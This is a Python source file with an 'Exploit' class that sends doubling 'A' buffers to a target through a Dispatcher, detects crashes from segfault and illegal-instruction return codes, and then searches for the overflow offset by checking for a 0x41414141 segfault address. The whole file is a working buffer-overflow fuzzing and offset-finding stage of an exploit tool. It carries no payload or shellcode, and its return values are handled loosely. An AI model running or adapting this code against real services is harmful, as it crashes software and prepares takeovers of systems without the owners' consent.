
from dispatcher import Dispatcher

class Exploit:
    def __init__(self, config):
        self.config = config
        self.verbose = config.get("verbose", False)
        self.dispatcher = Dispatcher(config)

    def try_overflow(self):
        buffer_size = 16
        while buffer_size <= 2048:
            try:
                if self.verbose:
                    print(f"[+] Trying buffer size: {buffer_size}")

                self.dispatcher.connect()

                command = b"A" * buffer_size

                # Execute the command and check for buffer overflow
                try:
                    return_code = self.dispatcher.send_command(command)
                    if return_code == -11:
                        print(f"[!] Possible buffer overflow detected with size {buffer_size}")
                        return buffer_size
                    elif return_code == 132:
                        print(f"[!] Illegal instruction detected with size {buffer_size}")
                        return buffer_size
                except Exception as e:
                    print(f"[!] Possible overflow detected with size {buffer_size}: {e}")

                # Receive the response
                response = self.dispatcher.receive_response()
                if self.verbose:
                    print(f"[+] Received response: {response}")     
                if not response:
                    print("[-] No response received.")
                    print("[!] Possible buffer overflow detected.")
                    return buffer_size
            except Exception as e:
                print(f"[-] Error during overflow attempt with size {buffer_size}: {e}")
                return buffer_size
            finally:
                self.dispatcher.close()
            buffer_size *= 2

    def adjust_buffer_size(self, size):
        for _size in range(size, size * 2):
            address_segfault = self.dispatcher.get_segfault(b"A" * _size)
            if address_segfault != None and str(address_segfault) == "0x41414141":
                print(f"[+] Find the buffer overflow offset: {_size - 4}")
                return _size
        print("[!] No matching segfault address found, using original size.")
        return size
    def run(self):
        buffer_size = self.try_overflow()
        print(f"[+] Final buffer size: {buffer_size}")
        self.adjust_buffer_size(buffer_size)